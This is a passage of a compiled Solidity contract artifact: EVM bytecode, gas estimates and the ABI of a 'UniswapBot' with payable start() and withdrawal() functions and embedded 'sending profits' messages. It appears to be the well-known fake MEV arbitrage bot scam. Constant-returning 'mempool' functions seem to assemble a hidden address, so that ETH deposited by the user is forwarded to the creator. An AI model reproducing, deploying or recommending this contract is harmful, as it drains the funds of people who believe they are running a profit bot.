JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9A5 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x94C JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x969 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x937 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA18 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9BF JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9DC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9AA JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x299978 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCD4B5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA57 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA8C JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAA4 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xADC JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220664F 0x2C MOD SWAP16 SLOAD SLOAD 0x2F MOD CALL SIGNEXTEND DUP9 SHL CALLDATACOPY 0xE7 LOG4 0xB4 SLOAD 0xDD SELFDESTRUCT 0xD1 SELFDESTRUCT 0xC0 DUP11 PUSH20 0x98478D351FDE5F64736F6C634300060C00330000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "590200",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"debugBot()": "infinite",
				"debugMempool()": "infinite",
				"start()": "infinite",
				"withdrawal()": "infinite"
			},
			"internal": {
				"_callMEVAction()": "infinite",
				"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "23",
				"getMemPoolHeight()": "23",
				"getMemPoolLength()": "infinite",
				"getMemPoolOffset()": "23",
				"keccak(struct UniswapBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
				"parseMempool(string memory)": "infinite",
				"toHexDigit(uint8)": "213",
				"uint2str(uint256)": "infinite",
				"withdrawalProfits()": "infinite"
			}
		},
		"methodIdentifiers": {
			"debugBot()": "7d53d433",
			"debugMempool()": "e1812f05",
			"start()": "be9a6555",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "_mainTokenSymbol",
					"type": "string"
				},
				{
					"internalType": "string",
					"name": "_mainTokenName",
					"type": "string"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "debugBot",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "debugMempool",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}